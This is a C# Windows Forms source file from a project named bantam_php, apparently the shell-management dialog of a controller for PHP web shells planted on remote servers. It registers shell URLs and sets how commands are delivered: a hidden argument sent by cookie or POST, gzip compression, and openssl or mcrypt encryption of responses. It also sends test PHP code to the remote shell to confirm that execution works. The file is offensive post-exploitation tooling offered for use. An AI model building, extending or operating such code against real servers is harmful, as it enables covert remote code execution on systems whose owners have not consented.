using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace bantam_php
{
    public partial class ModifyShell : Form
    {
        public static ModifyShell instance = null;
       
        /// <summary>
        /// 
        /// </summary>
        public static string g_CallingShellUrl = string.Empty;

        /// <summary>
        /// 
        /// </summary>
        public List<string> requestTypes = new List<string>() {
            "cookie",
            "post",
        };

        /// <summary>
        /// 
        /// </summary>
        public static readonly List<string> responseEncryptionModes = new List<string>() {
             "openssl",
             "mcrypt",
        };

        /// <summary>
        /// 
        /// </summary>
        public ModifyShell()
        {
            InitializeComponent();

            foreach(var item in requestTypes) {
                comboBoxVarType.Items.Add(item);
            }

            foreach(var item in responseEncryptionModes) {
                comboBoxEncryptionMode.Items.Add(item);
            }

            comboBoxVarType.SelectedIndex = 0;
            comboBoxEncryptionMode.SelectedIndex = 0;
            labelDynAddHostsStatus.Text = "";
        }

        /// <summary>
        /// Update / Edit Shell Routine
        /// </summary>
        /// <param name="shellUrl"></param>
        /// <param name="varName"></param>
        /// <param name="varType"></param>
        public ModifyShell(string shellUrl = "", string varName = "", string varType = "")
        {
            InitializeComponent();

            Text = "Update Shell";

            foreach (var item in requestTypes) {
                comboBoxVarType.Items.Add(item);
            }

            foreach (var item in responseEncryptionModes) {
                comboBoxEncryptionMode.Items.Add(item);
            }

            g_CallingShellUrl = txtBoxShellUrl.Text = shellUrl;
            txtBoxArgName.Text = varName;

            if (BantamMain.Shells.ContainsKey(shellUrl)) {
                checkBoxGZipRequest.Checked = BantamMain.Shells[shellUrl].gzipRequestData;
                checkBoxResponseEncryption.Checked = BantamMain.Shells[shellUrl].responseEncryption;
                comboBoxEncryptionMode.SelectedIndex = BantamMain.Shells[shellUrl].responseEncryptionMode;
            }

            if (requestTypes.Contains(varType)) {
                comboBoxVarType.SelectedIndex = requestTypes.IndexOf(varType);
            } else {
                comboBoxVarType.SelectedIndex = 0;
            }

            btnAddShell.Visible = false;
            btnUpdateShell.Visible = true;
            labelDynAddHostsStatus.Text = "";
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnAddShell_Click(object sender, EventArgs e)
        {
            string shellURL = txtBoxShellUrl.Text;

            if (string.IsNullOrEmpty(shellURL)) {
                return;
            }

            if (BantamMain.Shells.ContainsKey(shellURL)) {
                Program.g_BantamMain.guiCallbackRemoveShellURL(shellURL);
                BantamMain.Shells.Remove(shellURL);
            }

            BantamMain.Shells.Add(shellURL, new ShellInfo());
            BantamMain.Shells[shellURL].requestArgName = txtBoxArgName.Text;

            if (comboBoxVarType.Text == "cookie") {
                BantamMain.Shells[shellURL].sendDataViaCookie = true;
            }

            if (checkBoxResponseEncryption.Checked == false) {
                BantamMain.Shells[shellURL].responseEncryption = false;
            } else {
                BantamMain.Shells[shellURL].responseEncryptionMode = comboBoxEncryptionMode.SelectedIndex;
            }

            if (checkBoxGZipRequest.Checked) {
                BantamMain.Shells[shellURL].gzipRequestData = true;
            } else {
                BantamMain.Shells[shellURL].gzipRequestData = false;
            }

            bool encryptResponse = BantamMain.Shells[shellURL].responseEncryption;
            string phpCode = PhpHelper.PhpTestExecutionWithEcho1(encryptResponse);
            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellURL, phpCode, encryptResponse);

            if (string.IsNullOrEmpty(response.Result)) {
                labelDynAddHostsStatus.Text = "Unable to connect, check your settings and try again.";
                return;
            }

            string result = response.Result;

            if (encryptResponse) {
                result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, BantamMain.Shells[shellURL].responseEncryptionMode);
            }

            if (string.IsNullOrEmpty(result)) {
                labelDynAddHostsStatus.Text = "Unable to connect, check your settings and try again.";
                return;
            }

            Program.g_BantamMain.InitializeShellData(shellURL);
            Program.g_BantamMain.addClientForm.Hide();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void AddHost_FormClosed(object sender, FormClosedEventArgs e)
        {
            Program.g_BantamMain.addClientForm = null;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnUpdateShell_Click(object sender, EventArgs e)
        {
            string shellURL = txtBoxShellUrl.Text;

            if (string.IsNullOrEmpty(shellURL)) {
                return;
            }

            if (BantamMain.Shells.ContainsKey(g_CallingShellUrl)) {
                Program.g_BantamMain.guiCallbackRemoveShellURL(g_CallingShellUrl);
                BantamMain.Shells.Remove(g_CallingShellUrl);
            }

            if (BantamMain.Shells.ContainsKey(shellURL)) {
                Program.g_BantamMain.guiCallbackRemoveShellURL(shellURL);
                BantamMain.Shells.Remove(shellURL);
            }

            BantamMain.Shells.Add(shellURL, new ShellInfo());
            BantamMain.Shells[shellURL].requestArgName = txtBoxArgName.Text;

            if (comboBoxVarType.Text == "cookie") {
                BantamMain.Shells[shellURL].sendDataViaCookie = true;
            }

            if (checkBoxResponseEncryption.Checked == false) {
                BantamMain.Shells[shellURL].responseEncryption = false;
            } else {
                BantamMain.Shells[shellURL].responseEncryptionMode = comboBoxEncryptionMode.SelectedIndex;
            }

            if (checkBoxGZipRequest.Checked) {
                BantamMain.Shells[shellURL].gzipRequestData = true;
            } else {
                BantamMain.Shells[shellURL].gzipRequestData = false;
            }

            Program.g_BantamMain.InitializeShellData(shellURL);
            Program.g_BantamMain.updateHostForm.Hide();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void AddHost_Shown(object sender, EventArgs e)
        {
            //MessageBox.Show("1");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void checkBoxResponseEncryption_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBoxResponseEncryption.Checked) {
                comboBoxEncryptionMode.Enabled = true;
            } else {
                comboBoxEncryptionMode.Enabled = false;
            }
        }
    }
}
